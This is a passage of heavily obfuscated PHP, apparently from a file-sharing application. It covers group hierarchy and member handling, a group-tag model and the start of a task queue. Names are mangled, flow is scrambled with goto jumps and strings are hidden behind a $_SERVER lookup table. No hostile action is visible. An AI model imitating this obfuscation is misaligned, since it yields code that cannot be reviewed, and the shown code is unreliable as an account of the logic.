array($F¡ÖÛ‹ä¼Ã[7], $AÊöå¡³ª¦)); goto f£öíÉ¿¬Ü; a³ÄÃ‘Æ: foreach ($aõ˜·ëôùÊ as &$bÏöÓÒïÆÚ) { $CÈ¦İÑìÛ = $bÏöÓÒïÆÚ[$F¡ÖÛ‹ä¼Ã[1694]]; $bÏöÓÒïÆÚ[$F¡ÖÛ‹ä¼Ã[1786]] = isset($Eò¢¦•‚ÜŸ[$CÈ¦İÑìÛ]) ? intval($Eò¢¦•‚ÜŸ[$CÈ¦İÑìÛ]) : !1; } unset($bÏöÓÒïÆÚ); goto cõ”ÀÅ‰; f£öíÉ¿¬Ü: $f‹«ê‘ÊµÖ = array($F¡ÖÛ‹ä¼Ã[472], $F¡ÖÛ‹ä¼Ã[1785] => $F¡ÖÛ‹ä¼Ã[474]); $Cù†•ã¥­¬ = $this->field($f‹«ê‘ÊµÖ)->where($a¾¯Ï ¥„¥)->group($F¡ÖÛ‹ä¼Ã[472])->select(); $Eò¢¦•‚ÜŸ = array_to_keyvalue($Cù†•ã¥­¬, $F¡ÖÛ‹ä¼Ã[472], $F¡ÖÛ‹ä¼Ã[474]); goto a³ÄÃ‘Æ; cõ”ÀÅ‰: } private function _listAppendChildrenMember(&$e˜éá •) { goto EÂÃ·ËÎå‰; d±àØ§ºÊ: $aÕé°Şšˆ = array($A¥ëî§Ê‹Ÿ[1694], $A¥ëî§Ê‹Ÿ[1785] => $A¥ëî§Ê‹Ÿ[474]); $D„‚ÉÂİÇ¿ = Model($A¥ëî§Ê‹Ÿ[1777])->field($aÕé°Şšˆ)->where($bç¿ëöšù‹)->group($A¥ëî§Ê‹Ÿ[1694])->select(); $e±õÓÈ±Øà = array_to_keyvalue($D„‚ÉÂİÇ¿, $A¥ëî§Ê‹Ÿ[1694], $A¥ëî§Ê‹Ÿ[474]); goto CÒºø…ÂÓî; CÒºø…ÂÓî: foreach ($e˜éá • as &$BÂ÷äÌ‡éÄ) { $Aì¶ÊÓçÒØ = $BÂ÷äÌ‡éÄ[$A¥ëî§Ê‹Ÿ[1694]]; $BÂ÷äÌ‡éÄ[$A¥ëî§Ê‹Ÿ[1787]] = isset($e±õÓÈ±Øà[$Aì¶ÊÓçÒØ]) ? intval($e±õÓÈ±Øà[$Aì¶ÊÓçÒØ]) : !1; } unset($BÂ÷äÌ‡éÄ); goto Aß˜ ñ•Ûù; EÂÃ·ËÎå‰: $A¥ëî§Ê‹Ÿ =& $_SERVER[…ë˜õ]; $cùÄöÓªÛŒ = array_to_keyvalue($e˜éá •, $A¥ëî§Ê‹Ÿ[33], $A¥ëî§Ê‹Ÿ[1694]); $bç¿ëöšù‹ = array($A¥ëî§Ê‹Ÿ[1694] => array($A¥ëî§Ê‹Ÿ[7], $cùÄöÓªÛŒ)); goto d±àØ§ºÊ; Aß˜ ñ•Ûù: } private function _listAppendMeta(&$FÍ…ÑĞé Ù, $eËƒ°­‚å®) { goto c™Ùí¹ÊÜÍ; B›©¬­‡²ğ: foreach ($FÍ…ÑĞé Ù as &$Bïğùˆä) { $Bïğùˆä[$Böµ¤ª±ß[439]] = array(); if (isset($BÙ¡¥ã®‹š[$Bïğùˆä[$Böµ¤ª±ß[1694]]])) { $Bïğùˆä[$Böµ¤ª±ß[439]] = $BÙ¡¥ã®‹š[$Bïğùˆä[$Böµ¤ª±ß[1694]]]; } } unset($Bïğùˆä); goto FÒ¼Ÿ®Ùâ; BµŞ²’ğ¶Î: $BÙ¡¥ã®‹š = array_to_keyvalue_group($BÙ¡¥ã®‹š, $Böµ¤ª±ß[1694]); foreach ($BÙ¡¥ã®‹š as &$f÷†˜ƒˆâ°) { $f÷†˜ƒˆâ° = array_to_keyvalue($f÷†˜ƒˆâ°, $Böµ¤ª±ß[92], $Böµ¤ª±ß[370]); } unset($f÷†˜ƒˆâ°); goto B›©¬­‡²ğ; c™Ùí¹ÊÜÍ: $Böµ¤ª±ß =& $_SERVER[…ë˜õ]; $E¹‚øˆ—ğ = array($Böµ¤ª±ß[1694] => array($Böµ¤ª±ß[7], $eËƒ°­‚å®)); $BÙ¡¥ã®‹š = Model($Böµ¤ª±ß[1776])->where($E¹‚øˆ—ğ)->select(); goto BµŞ²’ğ¶Î; FÒ¼Ÿ®Ùâ: } protected function parentLevelArray($a‡­Ñ¬½¯) { $B”æ¤µòõ =& $_SERVER[…ë˜õ]; $a‡­Ñ¬½¯ = explode($B”æ¤µòõ[47], trim($a‡­Ñ¬½¯, $B”æ¤µòõ[47])); $a‡­Ñ¬½¯ = array_remove_value($a‡­Ñ¬½¯, $B”æ¤µòõ[491]); return $a‡­Ñ¬½¯; } private function _listAppendParent(&$aÄ¥Ì³¤¸À) { goto AŞŒ‰³ã„º; AŞŒ‰³ã„º: $c‡ÌÅÃñö =& $_SERVER[…ë˜õ]; $d—Şã¶œ°» = array(); foreach ($aÄ¥Ì³¤¸À as &$fì´è‚ŠºÁ) { $d—Şã¶œ°»[$fì´è‚ŠºÁ[$c‡ÌÅÃñö[1694]]] = $fì´è‚ŠºÁ[$c‡ÌÅÃñö[28]]; $Dá™çÂí‰à = $this->parentLevelArray($fì´è‚ŠºÁ[$c‡ÌÅÃñö[481]]); foreach ($Dá™çÂí‰à as $e«Ë¢áÊ›ƒ) { if (!isset($d—Şã¶œ°»[$e«Ë¢áÊ›ƒ])) { $d—Şã¶œ°»[$e«Ë¢áÊ›ƒ] = 0; } } } goto C¡˜Á×±¤·; d¦•è½ËòÁ: if ($GLOBALS[$c‡ÌÅÃñö[479]] == $c‡ÌÅÃñö[86]) { $c¿è¬á‘á = !1; } foreach ($aÄ¥Ì³¤¸À as &$fì´è‚ŠºÁ) { $Dá™çÂí‰à = $this->parentLevelArray($fì´è‚ŠºÁ[$c‡ÌÅÃñö[481]]); $bŸ‹ÍÈ‡Ò‡ = $c‡ÌÅÃñö[33]; foreach ($Dá™çÂí‰à as $fˆ²‰¥‘Ş‹ => $e«Ë¢áÊ›ƒ) { if ($c¿è¬á‘á && $fˆ²‰¥‘Ş‹ == 0) { continue; } $bŸ‹ÍÈ‡Ò‡ .= $d—Şã¶œ°»[$e«Ë¢áÊ›ƒ] . $c‡ÌÅÃñö[8]; } if ($Dá™çÂí‰à) { $bŸ‹ÍÈ‡Ò‡ .= $fì´è‚ŠºÁ[$c‡ÌÅÃñö[28]]; } $fì´è‚ŠºÁ[$c‡ÌÅÃñö[485]] = str_replace($c‡ÌÅÃñö[490], $c‡ÌÅÃñö[8], $bŸ‹ÍÈ‡Ò‡); } unset($fì´è‚ŠºÁ); goto D¯Ï—œäˆ; C¡˜Á×±¤·: unset($fì´è‚ŠºÁ); foreach ($d—Şã¶œ°» as $fˆ²‰¥‘Ş‹ => $fœ²¤™Ÿ”Ü) { if ($fœ²¤™Ÿ”Ü) { continue; } $AğÊ†Ú­ƒ = $this->getInfoSimple($fˆ²‰¥‘Ş‹); $d—Şã¶œ°»[$fˆ²‰¥‘Ş‹] = $AğÊ†Ú­ƒ[$c‡ÌÅÃñö[28]]; } $c¿è¬á‘á = $GLOBALS[$c‡ÌÅÃñö[6]][$c‡ÌÅÃñö[87]][$c‡ÌÅÃñö[1788]]; goto d¦•è½ËòÁ; D¯Ï—œäˆ: } private function _listAppendSourceRoot(&$C‰Â¿Îƒ¦, $d©¾Úàª¢“) { goto EÑ¹Ó—¿à½; EÑ¹Ó—¿à½: $e… œÒ‚˜Ç =& $_SERVER[…ë˜õ]; $a­Ó‰î™Ö = array($e… œÒ‚˜Ç[398] => SourceModel::TYPE_GROUP, $e… œÒ‚˜Ç[472] => 0, $e… œÒ‚˜Ç[478] => array($e… œÒ‚˜Ç[7], $d©¾Úàª¢“)); $eàììÁÄìœ = $e… œÒ‚˜Ç[1789]; goto F·İÌ¿¸ğ; F·İÌ¿¸ğ: $có‰‰šİãß = Model($e… œÒ‚˜Ç[796])->order($e… œÒ‚˜Ç[1790])->field($eàììÁÄìœ)->where($a­Ó‰î™Ö)->select(); $có‰‰šİãß = array_to_keyvalue($có‰‰šİãß, $e… œÒ‚˜Ç[478]); $có‰‰šİãß = array_remove_key($có‰‰šİãß, $e… œÒ‚˜Ç[478]); goto aòöòï¸ãñ; aòöòï¸ãñ: foreach ($C‰Â¿Îƒ¦ as &$cÂöÕ¬Î·) { $cÂöÕ¬Î·[$e… œÒ‚˜Ç[84]] = $có‰‰šİãß[$cÂöÕ¬Î·[$e… œÒ‚˜Ç[1694]]] ? $có‰‰šİãß[$cÂöÕ¬Î·[$e… œÒ‚˜Ç[1694]]] : array(); } unset($cÂöÕ¬Î·); goto Dƒ–“¼°‹œ; Dƒ–“¼°‹œ: } protected function groupMerge($CèÖ¸Àê¾) { $CèÖ¸Àê¾ = array_values(array_unique($CèÖ¸Àê¾)); $a¨Ñ†ÎÑ¼á = array(); for ($FĞ½—÷†©â = 0; $FĞ½—÷†©â < count($CèÖ¸Àê¾); $FĞ½—÷†©â++) { $EøæíƒÙ«˜ = !1; for ($E°²‘ÕïÏà = 0; $E°²‘ÕïÏà < count($CèÖ¸Àê¾); $E°²‘ÕïÏà++) { if ($FĞ½—÷†©â == $E°²‘ÕïÏà) { continue; } if ($this->isParentOf($CèÖ¸Àê¾[$E°²‘ÕïÏà], $CèÖ¸Àê¾[$FĞ½—÷†©â])) { $EøæíƒÙ«˜ = !0; break; } } if (!$EøæíƒÙ«˜) { $a¨Ñ†ÎÑ¼á[] = $CèÖ¸Àê¾[$FĞ½—÷†©â]; } } return $a¨Ñ†ÎÑ¼á; } protected function isParentOf($dß¯¹åö±, $FÔèë²ØÓ) { goto aâŞ’ÂÜ¶é; aâŞ’ÂÜ¶é: $cƒ‰‹©ƒ© =& $_SERVER[…ë˜õ]; if (!$dß¯¹åö± || !$FÔèë²ØÓ || $dß¯¹åö± == $FÔèë²ØÓ) { return !1; } $EÒÕÑ›‚• = $this->getInfoSimple($dß¯¹åö±); goto eîÍ›‹â‹­; fçì•Ï‰ˆ: return !1; goto FÁ“Š¬Ó©Ã; eîÍ›‹â‹­: $AÑ³Û¦Äâˆ = $this->getInfoSimple($FÔèë²ØÓ); $A§ËíÀšŸ¯ = $EÒÕÑ›‚•[$cƒ‰‹©ƒ©[481]] . $dß¯¹åö± . $cƒ‰‹©ƒ©[47]; if (substr($AÑ³Û¦Äâˆ[$cƒ‰‹©ƒ©[481]], 0, strlen($A§ËíÀšŸ¯)) == $A§ËíÀšŸ¯) { return !0; } goto fçì•Ï‰ˆ; FÁ“Š¬Ó©Ã: } public function groupShowRoot($EÜ¤œ®ÔÚÑ, $Cªğîéõ¶ = false) { goto AİÌ½Ëñ÷„; dêË”î¬ˆì: if ($Cªğîéõ¶ && count($BÁŞ–ÂÔ‚«) == 1) { return $a‘Ë«ÖÑÕ; } if (!$a‘Ùœä È[$D¤¨ªèÃ‡Ò[439]] || !isset($a‘Ùœä È[$D¤¨ªèÃ‡Ò[439]][$D¤¨ªèÃ‡Ò[1772]]) || $a‘Ùœä È[$D¤¨ªèÃ‡Ò[439]][$D¤¨ªèÃ‡Ò[1772]] == $D¤¨ªèÃ‡Ò[1745]) { return $this->groupShowRoot($BÁŞ–ÂÔ‚«[count($BÁŞ–ÂÔ‚«) - 1], $Cªğîéõ¶); } if ($a‘Ùœä È[$D¤¨ªèÃ‡Ò[439]][$D¤¨ªèÃ‡Ò[1772]] == $D¤¨ªèÃ‡Ò[355]) { $e‡¯‚ôÉÁè = explode($D¤¨ªèÃ‡Ò[47], $a‘Ùœä È[$D¤¨ªèÃ‡Ò[439]][$D¤¨ªèÃ‡Ò[1773]]); if ($e‡¯‚ôÉÁè) { $a‘Ë«ÖÑÕ = array_merge($a‘Ë«ÖÑÕ, $e‡¯‚ôÉÁè); } } goto dğÁõÄğà; AİÌ½Ëñ÷„: $D¤¨ªèÃ‡Ò =& $_SERVER[…ë˜õ]; $a‘Ùœä È = $this->getInfo($EÜ¤œ®ÔÚÑ); if (!$a‘Ùœä È) { return array(); } goto a´ÜÈ®Ä³Ç; dğÁõÄğà: return $a‘Ë«ÖÑÕ; goto F†«äÕÙ; a´ÜÈ®Ä³Ç: $BÁŞ–ÂÔ‚« = $this->parentLevelArray($a‘Ùœä È[$D¤¨ªèÃ‡Ò[481]]); $a‘Ë«ÖÑÕ = array($EÜ¤œ®ÔÚÑ); if (count($BÁŞ–ÂÔ‚«) == 0) { return $a‘Ë«ÖÑÕ; } goto dêË”î¬ˆì; F†«äÕÙ: } protected function resetParentLevel() { $c†ìïÂ¾å =& $_SERVER[…ë˜õ]; $b­Á½·Ş†¸ = $c†ìïÂ¾å[1694]; $dÂÖ»Å£„¨ = $this->select(); $dÂÖ»Å£„¨ = array_to_keyvalue($dÂÖ»Å£„¨, $b­Á½·Ş†¸); foreach ($dÂÖ»Å£„¨ as $AÜŠ°¡¡éš) { goto D¾àŒØê; D¾àŒØê: $BÉ†À¯¨ÅË = $AÜŠ°¡¡éš; $bˆ»‰ÜŒœ = array(); while ($BÉ†À¯¨ÅË[$c†ìïÂ¾å[472]] != 0) { $bˆ»‰ÜŒœ[] = $BÉ†À¯¨ÅË[$c†ìïÂ¾å[472]]; $BÉ†À¯¨ÅË = $dÂÖ»Å£„¨[$BÉ†À¯¨ÅË[$c†ìïÂ¾å[472]]]; } goto FŞÓ‘öô–Ø; E«Õ¥ùôöÂ: $this->where(array($b­Á½·Ş†¸ => $AÜŠ°¡¡éš[$b­Á½·Ş†¸]))->save(array($c†ìïÂ¾å[548] => $bˆ»‰ÜŒœ)); goto Cç¯Ü‚íä«; FŞÓ‘öô–Ø: $bˆ»‰ÜŒœ[] = 0; $bˆ»‰ÜŒœ = $c†ìïÂ¾å[47] . implode($c†ìïÂ¾å[47], array_reverse($bˆ»‰ÜŒœ)) . $c†ìïÂ¾å[47]; $this->setNamePinyin($AÜŠ°¡¡éš[$b­Á½·Ş†¸], $AÜŠ°¡¡éš[$c†ìïÂ¾å[28]]); goto E«Õ¥ùôöÂ; Cç¯Ü‚íä«: } return $dÂÖ»Å£„¨; } public function groupNameAuto($Aƒ• †Ó, $B¢Ûôñ ‹‚) { $A­­††³ ˆ =& $_SERVER[…ë˜õ]; $B‚‚á¨¦‹ = $this->where(array($A­­††³ ˆ[389] => $Aƒ• †Ó))->getField($A­­††³ ˆ[28], !0); if (!$B‚‚á¨¦‹ || !in_array($B¢Ûôñ ‹‚, $B‚‚á¨¦‹)) { return $B¢Ûôñ ‹‚; } for ($f†ëé¸¢³· = 1; $f†ëé¸¢³· <= count($B‚‚á¨¦‹) + 1; $f†ëé¸¢³·++) { $cµàœ¾¤Òî = $B¢Ûôñ ‹‚ . "\50{$f†ëé¸¢³·}\x29"; if (!in_array($cµàœ¾¤Òî, $B‚‚á¨¦‹)) { return $cµàœ¾¤Òî; } } } public function groupSwitch($fãÜÒŠ±¹, $dÊÇª¢ï«Š) { goto BóŠ¥ó¿Õ…; Aäâª’‘ô«: $aÇó‰âÓ¶ = array($Fˆ×÷Æİ„è[398] => 2, $Fˆ×÷Æİ„è[472] => 0, $Fˆ×÷Æİ„è[397] => 1, $Fˆ×÷Æİ„è[478] => array($Fˆ×÷Æİ„è[7], array($fãÜÒŠ±¹, $dÊÇª¢ï«Š))); $CÄòè¬…Å³ = Model($Fˆ×÷Æİ„è[796])->where($aÇó‰âÓ¶)->field($Fˆ×÷Æİ„è[1792])->select(); $CÄòè¬…Å³ = array_to_keyvalue($CÄòè¬…Å³, $Fˆ×÷Æİ„è[478], $Fˆ×÷Æİ„è[390]); goto f˜…‹·ƒæ ; aƒ®Ñ†¨öß: $Dá…¦Ì¦ê¬ = array_to_keyvalue($Dá…¦Ì¦ê¬, $Fˆ×÷Æİ„è[1694]); if (!isset($Dá…¦Ì¦ê¬[$fãÜÒŠ±¹]) || !isset($Dá…¦Ì¦ê¬[$dÊÇª¢ï«Š]) || $Dá…¦Ì¦ê¬[$fãÜÒŠ±¹][$Fˆ×÷Æİ„è[472]] == 0) { return !1; } $aÇó‰âÓ¶ = array($Fˆ×÷Æİ„è[1694] => $fãÜÒŠ±¹); goto c“¼¬‰¨½; c“¼¬‰¨½: $Bƒ¹ÊŠÛ«» = Model($Fˆ×÷Æİ„è[1777])->where($aÇó‰âÓ¶)->select(); if (!$Bƒ¹ÊŠÛ«») { $Bƒ¹ÊŠÛ«» = array(); } foreach ($Bƒ¹ÊŠÛ«» as $eóë‘À‹¬Ñ) { $e¢ˆ«ì³ùó = $eóë‘À‹¬Ñ[$Fˆ×÷Æİ„è[1531]]; $aÇó‰âÓ¶ = array($Fˆ×÷Æİ„è[1531] => $e¢ˆ«ì³ùó, $Fˆ×÷Æİ„è[1694] => $dÊÇª¢ï«Š); $b³æáµÇœ„ = Model($Fˆ×÷Æİ„è[1777])->where($aÇó‰âÓ¶)->find(); if (!$b³æáµÇœ„) { $d¿Ş§ ¯«Å = array($dÊÇª¢ï«Š => $eóë‘À‹¬Ñ[$Fˆ×÷Æİ„è[1791]]); Model($Fˆ×÷Æİ„è[501])->userGroupAdd($e¢ˆ«ì³ùó, $d¿Ş§ ¯«Å); } Model($Fˆ×÷Æİ„è[501])->userGroupRemove($e¢ˆ«ì³ùó, $fãÜÒŠ±¹); } goto Aäâª’‘ô«; E™Õ£›¢Íä: $this->where(array($Fˆ×÷Æİ„è[472] => $fãÜÒŠ±¹))->save(array($Fˆ×÷Æİ„è[472] => $dÊÇª¢ï«Š)); return !0; goto a…¥¿ÙÉ‰¨; BóŠ¥ó¿Õ…: $Fˆ×÷Æİ„è =& $_SERVER[…ë˜õ]; $aÇó‰âÓ¶ = array($Fˆ×÷Æİ„è[1694] => array($Fˆ×÷Æİ„è[7], array($fãÜÒŠ±¹, $dÊÇª¢ï«Š))); $Dá…¦Ì¦ê¬ = $this->where($aÇó‰âÓ¶)->select(); goto aƒ®Ñ†¨öß; f˜…‹·ƒæ : $bÃĞÜ¼Íæî = !empty($CÄòè¬…Å³[$fãÜÒŠ±¹]) ? $CÄòè¬…Å³[$fãÜÒŠ±¹] : !1; if ($bÃĞÜ¼Íæî) { goto AùÚ„ßöÜí; CŞÀäË¬Á¿: $CÄòè¬…Å³ = Model($Fˆ×÷Æİ„è[796])->where($aÇó‰âÓ¶)->field($Fˆ×÷Æİ„è[1793])->select(); if (!$CÄòè¬…Å³) { $CÄòè¬…Å³ = array(); } Model($Fˆ×÷Æİ„è[796])->moveClearAuth = !1; goto CÀÌ½Ù«°é; AùÚ„ßöÜí: if (!$CÄòè¬…Å³[$dÊÇª¢ï«Š]) { $CÄòè¬…Å³[$dÊÇª¢ï«Š] = Model($Fˆ×÷Æİ„è[796])->groupRootAdd($dÊÇª¢ï«Š); } $aî“¤ŞÁ÷¼ = $CÄòè¬…Å³[$dÊÇª¢ï«Š]; $aÇó‰âÓ¶ = array($Fˆ×÷Æİ„è[472] => $bÃĞÜ¼Íæî); goto CŞÀäË¬Á¿; E‹ù–®ÕŒ’: $EÓéÊ›†ŒÑ = array($Fˆ×÷Æİ„è[478] => $dÊÇª¢ï«Š); Model($Fˆ×÷Æİ„è[1794])->where($aÇó‰âÓ¶)->save($EÓéÊ›†ŒÑ); Model($Fˆ×÷Æİ„è[1795])->where($aÇó‰âÓ¶)->save($EÓéÊ›†ŒÑ); goto bè—íô¢š; CÀÌ½Ù«°é: foreach ($CÄòè¬…Å³ as $bÕùºóÚÑŞ) { $dÅÅ¯Ùã’’ = $bÕùºóÚÑŞ[$Fˆ×÷Æİ„è[397]] == $Fˆ×÷Æİ„è[86] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Fˆ×÷Æİ„è[796])->move($bÕùºóÚÑŞ[$Fˆ×÷Æİ„è[390]], $aî“¤ŞÁ÷¼, $dÅÅ¯Ùã’’); } Model($Fˆ×÷Æİ„è[796])->moveClearAuth = !0; $aÇó‰âÓ¶ = array($Fˆ×÷Æİ„è[398] => 2, $Fˆ×÷Æİ„è[478] => $fãÜÒŠ±¹); goto E‹ù–®ÕŒ’; bè—íô¢š: } $this->_changeChildLevel($Dá…¦Ì¦ê¬[$fãÜÒŠ±¹], $Dá…¦Ì¦ê¬[$dÊÇª¢ï«Š], !0); goto E™Õ£›¢Íä; a…¥¿ÙÉ‰¨: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($díÂšÒÛ¤Ï) { $E¦„ÒˆÌ•Ì =& $_SERVER[…ë˜õ]; return array($E¦„ÒˆÌ•Ì[1796] => array($díÂšÒÛ¤Ï[0], $E¦„ÒˆÌ•Ì[1797]), $E¦„ÒˆÌ•Ì[1798] => array($díÂšÒÛ¤Ï[0], $E¦„ÒˆÌ•Ì[1799])); } protected function get($F·ß‚«’Ş) { $DÇƒ¾²Å¡ =& $_SERVER[…ë˜õ]; $eœ»à‘¢À = Model($DÇƒ¾²Å¡[480])->metaGet($F·ß‚«’Ş, $DÇƒ¾²Å¡[1800]); $D‰ª×¥„‡È = json_decode($eœ»à‘¢À, !0); return $D‰ª×¥„‡È ? $D‰ª×¥„‡È : array($DÇƒ¾²Å¡[1801] => $DÇƒ¾²Å¡[86], $DÇƒ¾²Å¡[365] => array()); } protected function set($C÷×ÂÉ…õ, $eÒ„Âò¡„™) { $AæõÒŠ‡­ =& $_SERVER[…ë˜õ]; $eÒ„Âò¡„™ = $eÒ„Âò¡„™ ? $eÒ„Âò¡„™ : array($AæõÒŠ‡­[1801] => $AæõÒŠ‡­[86], $AæõÒŠ‡­[365] => array()); Model($AæõÒŠ‡­[480])->metaSet($C÷×ÂÉ…õ, $AæõÒŠ‡­[1800], json_encode($eÒ„Âò¡„™)); return Model($AæõÒŠ‡­[480])->metaSet($C÷×ÂÉ…õ, $AæõÒŠ‡­[1800], json_encode($eÒ„Âò¡„™)); } protected function getByTagID($a§¾À­öÚ, $aêøË½Âí) { goto FÆŠøÑ÷”; aàÅ¬©‚¹…: return is_array($d¸¢–´â’‘) ? $d¸¢–´â’‘ : !1; goto A‡®©—£Éï; dùë˜Ü¾: $bŠóĞ©³Á¡ = $this->get($a§¾À­öÚ); if (!$bŠóĞ©³Á¡ || !isset($bŠóĞ©³Á¡[$eÄå›İª‡[365]])) { return !1; } $d¸¢–´â’‘ = array_find_by_field($bŠóĞ©³Á¡[$eÄå›İª‡[365]], $eÄå›İª‡[388], $aêøË½Âí); goto aàÅ¬©‚¹…; FÆŠøÑ÷”: $eÄå›İª‡ =& $_SERVER[…ë˜õ]; if (!$a§¾À­öÚ || !$aêøË½Âí) { return !1; } if (!Model($eÄå›İª‡[480])->getInfoSimple($a§¾À­öÚ)) { return !1; } goto dùë˜Ü¾; A‡®©—£Éï: } public function listSource($E†ÙìßÙ, $fÉŞß—íÌÁ) { goto EË±ò‰åïœ; fµÏ‘¨: if ($b……«‚™) { $this->removeBySource($E†ÙìßÙ, $b……«‚™); } return $b˜ß¡¯í¦±; goto eÒÜ÷¨ğ; fŒŒ·íø: $dæñîì×Ô = array(); foreach ($DŸÈêë×‘Ğ as $b¼ ÒñëØ¼) { $bÀ’”øÅÁâ = $b¼ ÒñëØ¼[$b–¿®Şá¸[75]]; if (!$bÀ’”øÅÁâ) { continue; } if (!isset($dæñîì×Ô[$bÀ’”øÅÁâ])) { $dæñîì×Ô[$bÀ’”øÅÁâ] = array(); } $dæñîì×Ô[$bÀ’”øÅÁâ][] = $b¼ ÒñëØ¼[$b–¿®Şá¸[413]]; } $Fé‰Ğ’¨Š = array(); goto F»ÏäÊ¹Å; EË±ò‰åïœ: $b–¿®Şá¸ =& $_SERVER[…ë˜õ]; if ($fÉŞß—íÌÁ && !is_array($fÉŞß—íÌÁ)) { $fÉŞß—íÌÁ = array($fÉŞß—íÌÁ); } $DŸÈêë×‘Ğ = $this->listData($E†ÙìßÙ); goto fŒŒ·íø; eŒÇ½³›š™: $F§¿ãğƒ¬¥ = array_to_keyvalue($b˜ß¡¯í¦±[$b–¿®Şá¸[73]], $b–¿®Şá¸[33], $b–¿®Şá¸[390]); $dÍêÛ¿ø = array_merge($F§¿ãğƒ¬¥, $CÑ“Ù¾èè); foreach ($Fé‰Ğ’¨Š as $bÀ’”øÅÁâ) { if (!in_array($bÀ’”øÅÁâ, $dÍêÛ¿ø)) { $b……«‚™[] = $bÀ’”øÅÁâ; } } goto fµÏ‘¨; F»ÏäÊ¹Å: foreach ($dæñîì×Ô as $dŸùß‹½´Š => $E¬„·«©Ó˜) { $F„„×âõ˜¡ = !0; if (!$fÉŞß—íÌÁ) { $Fé‰Ğ’¨Š[] = $dŸùß‹½´Š; continue; } foreach ($fÉŞß—íÌÁ as $d¬èÅ­¡“Ò) { if (!in_array($d¬èÅ­¡“Ò, $E¬„·«©Ó˜)) { $F„„×âõ˜¡ = !1; break; } } if ($F„„×âõ˜¡) { $Fé‰Ğ’¨Š[] = $dŸùß‹½´Š; } } if (!$Fé‰Ğ’¨Š) { return array(); } $b˜ß¡¯í¦± = Model($b–¿®Şá¸[1209])->listSource(array($b–¿®Şá¸[404] => array($b–¿®Şá¸[405], $Fé‰Ğ’¨Š))); goto BË’Á½„‰‰; BË’Á½„‰‰: if (!$b˜ß¡¯í¦± || count($Fé‰Ğ’¨Š) == $b˜ß¡¯í¦±[$b–¿®Şá¸[362]][$b–¿®Şá¸[363]]) { return $b˜ß¡¯í¦±; } $b……«‚™ = array(); $CÑ“Ù¾èè = array_to_keyvalue($b˜ß¡¯í¦±[$b–¿®Şá¸[74]], $b–¿®Şá¸[33], $b–¿®Şá¸[390]); goto eŒÇ½³›š™; eÒÜ÷¨ğ: } protected function listData($fùñ í±¤) { $aŞã¬æà‘Š =& $_SERVER[…ë˜õ]; $AøÙÙ±ø©³ = array($aŞã¬æà‘Š[1522] => 0, $aŞã¬æà‘Š[457] => array($aŞã¬æà‘Š[1802], 0), $aŞã¬æà‘Š[409] => $aŞã¬æà‘Š[1803] . $fùñ í±¤); $fã¯ê˜ŒÜÃ = $aŞã¬æà‘Š[1804]; $c‰¦À‰’Ô› = $this->field($fã¯ê˜ŒÜÃ)->where($AøÙÙ±ø©³)->order($aŞã¬æà‘Š[1805])->select(); return $c‰¦À‰’Ô› ? $c‰¦À‰’Ô› : array(); } protected function addToTag($C’İØ‘ç, $a‹Ì·™â×‘, $F÷½‡Ú¸„ê) { $F„¸â¬±İÑ =& $_SERVER[…ë˜õ]; if (!$this->getByTagID($C’İØ‘ç, $F÷½‡Ú¸„ê) || !$a‹Ì·™â×‘) { return !1; } if (!Model($F„¸â¬±İÑ[796])->pathInfo($a‹Ì·™â×‘)) { return !1; } $dÔãÎ›Ê‘¢ = array($F„¸â¬±İÑ[1522] => 0, $F„¸â¬±İÑ[457] => $F÷½‡Ú¸„ê, $F„¸â¬±İÑ[408] => $a‹Ì·™â×‘, $F„¸â¬±İÑ[409] => $F„¸â¬±İÑ[1806] . $C’İØ‘ç, $F„¸â¬±İÑ[407] => $F„¸â¬±İÑ[33], $F„¸â¬±İÑ[1698] => 0); if ($this->where($dÔãÎ›Ê‘¢)->find()) { return !1; } return $this->add($dÔãÎ›Ê‘¢); } protected function removeFromTag($BÔ¤‚¨ääÃ, $Aœ¥œÚøóğ, $A»º·™†ˆ‰) { $Aî…§²©š‰ =& $_SERVER[…ë˜õ]; if (!$this->getByTagID($BÔ¤‚¨ääÃ, $A»º·™†ˆ‰) || !$Aœ¥œÚøóğ) { return !1; } if (is_array($Aœ¥œÚøóğ)) { $Aœ¥œÚøóğ = array($Aî…§²©š‰[7], $Aœ¥œÚøóğ); } $AÀÔŒøàù = array($Aî…§²©š‰[1522] => 0, $Aî…§²©š‰[457] => $A»º·™†ˆ‰, $Aî…§²©š‰[409] => $Aî…§²©š‰[1806] . $BÔ¤‚¨ääÃ, $Aî…§²©š‰[408] => $Aœ¥œÚøóğ); return $this->where($AÀÔŒøàù)->delete(); } protected function removeByTag($e—’‚Ôå…ë, $F´‰ËÔ–ô) { $c¾­âæ®Ä‘ =& $_SERVER[…ë˜õ]; if (!$this->getByTagID($e—’‚Ôå…ë, $F´‰ËÔ–ô)) { return !1; } $eËâ‘ò®“¦ = array($c¾­âæ®Ä‘[1522] => 0, $c¾­âæ®Ä‘[457] => $F´‰ËÔ–ô, $c¾­âæ®Ä‘[409] => $c¾­âæ®Ä‘[1806] . $e—’‚Ôå…ë); return $this->where($eËâ‘ò®“¦)->delete(); } protected function removeBySource($CœÕÆØ¶‡, $D¬ˆ…Ğ¶ó‘) { $dãñ´¦¬“Ø =& $_SERVER[…ë˜õ]; if (!$CœÕÆØ¶‡ || !$D¬ˆ…Ğ¶ó‘) { return !1; } if (is_array($D¬ˆ…Ğ¶ó‘)) { $D¬ˆ…Ğ¶ó‘ = array($dãñ´¦¬“Ø[7], $D¬ˆ…Ğ¶ó‘); } $BÒ½¢µ¶Ú = array($dãñ´¦¬“Ø[1522] => 0, $dãñ´¦¬“Ø[408] => $D¬ˆ…Ğ¶ó‘, $dãñ´¦¬“Ø[457] => array($dãñ´¦¬“Ø[977], 0), $dãñ´¦¬“Ø[409] => $dãñ´¦¬“Ø[1806] . $CœÕÆØ¶‡); return $this->where($BÒ½¢µ¶Ú)->delete(); } } goto cóÎ¨ÓÍÈ’; b»Š÷Ûã–ï: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\x73\x6b\121\x75\145\x75\x65\114\x65\x6e\147\164\150"; const QUEUE_DATA = "\164\x61\x73\153\121\x75\x65\165\145\104\x61\x74\141"; public static $listData = false; public static function initTask() { } public static function add($Eƒİ¹¡¦²ì, $CØœ‚ÜˆŸ× = array(), $A¯æíÔØ¸¾ = '', $d ß‹øØ‚ = '') { $fŞ–µ‰ˆ™ =& $_SERVER[…ë˜õ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) 